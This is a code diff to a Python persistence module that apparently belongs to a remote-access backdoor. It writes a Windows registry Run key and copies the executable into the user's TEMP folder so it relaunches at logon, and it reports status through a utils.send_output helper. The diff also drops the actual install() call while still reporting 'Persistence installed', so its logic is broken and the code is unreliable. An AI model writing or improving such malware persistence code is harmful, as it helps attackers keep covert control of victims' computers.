@@ -3,6 +3,7 @@ import sys
 import subprocess
 import shutil
 import requests
+import os
 
 import utils
 
@@ -19,8 +20,9 @@ EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)
 
 
 def install():
-    stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "%USERPROFILE%\\" + EXECUTABLE_NAME))
-    shutil.copyfile(EXECUTABLE_PATH, os.path.expanduser("~/%s" % EXECUTABLE_NAME))
+    if not is_installed():
+        stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, os.environ["TEMP"] + "\\" + EXECUTABLE_NAME))
+        shutil.copyfile(EXECUTABLE_PATH, os.environ["TEMP"] + "/" + EXECUTABLE_NAME)
 
 
 def clean():
@@ -42,7 +44,6 @@ def is_installed():
 
 def run(action):
     if action == "install":
-        install()
         utils.send_output("Persistence installed")
     elif action == "remove":
         clean()
